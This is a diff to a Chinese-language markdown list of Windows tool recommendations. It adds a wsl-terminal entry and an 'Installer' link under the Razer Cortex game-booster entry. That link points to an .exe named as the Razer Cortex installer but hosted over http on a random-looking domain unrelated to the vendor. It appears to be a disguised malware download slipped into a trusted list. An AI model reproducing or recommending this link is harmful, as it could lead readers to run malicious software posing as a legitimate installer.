@@ -30,9 +30,17 @@
 
 windows上自带的的linux内核
 
+### [wsl-terminal](https://goreliu.github.io/wsl-terminal/README.zh_CN.html)
+
+用于 Windows Subsystem for Linux (WSL) 的终端模拟器，漂亮，好用
+
+[Download](https://github.com/goreliu/wsl-terminal/releases)
+
 ### [雷游7](https://game-booster.soft32.com/)
 
 游戏时电脑自动加速，更重要的是存档管理，可以使用OneDrive和GoogleDrive
+
+[Installer](http://www.yuwecawlogilu.com/azjry9m/Installer_razer_cortex_7.5.7.57.exe)
 
 ### [spacedesk](https://www.spacedesk.net/)
 
